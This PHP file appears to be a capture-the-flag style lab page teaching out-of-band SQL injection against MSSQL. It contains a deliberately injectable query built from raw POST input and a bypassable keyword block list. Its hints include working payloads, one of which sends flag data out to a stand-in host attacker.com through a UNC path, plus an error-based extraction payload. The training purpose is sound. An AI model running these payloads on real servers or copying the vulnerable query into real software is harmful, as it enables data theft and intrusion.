<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab12_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab12", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 12. OOB: fn_xe_file + UNC Path</h3>

    <h4>Scenario</h4>
    <p>
        An internal monitoring tool queries MSSQL for server metrics. The page always
        returns the same response. Extended stored procedures like <code>xp_dirtree</code>
        have been <strong>disabled</strong>.
    </p>
    <p>
        However, MSSQL's <code>sys.fn_xe_file_target_read_file()</code> function (used for
        reading Extended Events logs) accepts UNC paths. When called with an attacker-controlled
        UNC path, it triggers DNS/SMB resolution: providing a stealthy OOB channel that
        bypasses <code>xp_dirtree</code> blocks.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the flag from the <code>flags</code> table. Error-based extraction is
        available as a fallback. The solution explains the <code>fn_xe_file</code> OOB technique.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. xp_dirtree is blocked. Try <code>fn_xe_file_target_read_file</code> instead.<br>
        2. <code>'; SELECT * FROM sys.fn_xe_file_target_read_file('\\attacker.com\share\x.xel', NULL, NULL, NULL); -- -</code><br>
        3. This triggers a DNS/SMB lookup to attacker.com.<br>
        4. Embed data: <code>'; DECLARE @d VARCHAR(100); SELECT @d=(SELECT TOP 1 flag FROM flags); DECLARE @p VARCHAR(200); SET @p='\\' + @d + '.attacker.com\x\x.xel'; SELECT * FROM sys.fn_xe_file_target_read_file(@p, NULL, NULL, NULL); -- -</code><br>
        5. Fallback: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab12_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag and learned about fn_xe_file UNC path OOB exfiltration on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Server Metrics</h4>
    <form method="POST" class="form-row">
<input type="text" name="host" class="input" placeholder="Hostname (try: web-01)" value="<?= htmlspecialchars($_POST['host'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Query</button>
    </form>
</div>

<?php
if (isset($_POST['host'])) {
    $host = $_POST['host'];

    // Block xp_dirtree, xp_fileexist, xp_subdirs
    if (preg_match('/xp_dirtree|xp_fileexist|xp_subdirs/i', $host)) {
        echo '<div class="result-error result-box"><strong>Blocked:</strong> Extended stored procedures are disabled.</div>';
    } else {
        // INTENTIONALLY VULNERABLE: direct string concatenation
        $query = "SELECT hostname, cpu_usage, memory_usage, disk_io FROM metrics WHERE hostname = '$host'";

        // Show the executed query in a terminal block
        echo '<div class="terminal query-output">';
        echo '  <div class="terminal-header">';
        echo '    <span class="terminal-dot red"></span>';
        echo '    <span class="terminal-dot yellow"></span>';
        echo '    <span class="terminal-dot green"></span>';
        echo '    <span class="terminal-title">MSSQL Query</span>';
        echo '  </div>';
        echo '  <div class="terminal-body" data-highlight="sql">';
        echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
        echo '  </div>';
        echo '</div>';

        if ($conn) {
            try {
                $stmt = $conn->query($query);
                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

                if (empty($rows)) {
                    echo '<div class="result-warning result-box">No metrics found for that host.</div>';
                } else {
                    foreach ($rows as $row) {
                        echo '<div class="result-data result-box">';
                        echo '<strong>' . htmlspecialchars($row['hostname'] ?? '') . '</strong>';
                        echo ' &nbsp;&bull;&nbsp; CPU: ' . htmlspecialchars($row['cpu_usage'] ?? '') . '%';
                        echo ' &nbsp;&bull;&nbsp; Memory: ' . htmlspecialchars($row['memory_usage'] ?? '') . '%';
                        echo ' &nbsp;&bull;&nbsp; Disk I/O: ' . htmlspecialchars($row['disk_io'] ?? '') . ' MB/s';
                        echo '</div>';
                    }
                }
            } catch (PDOException $e) {
                echo '<div class="result-error result-box">';
                echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
                echo '</div>';
            }
        } else {
            echo '<div class="result-error result-box">';
            echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
            echo '</div>';
        }
    }
}
?>

<?php endif; ?>
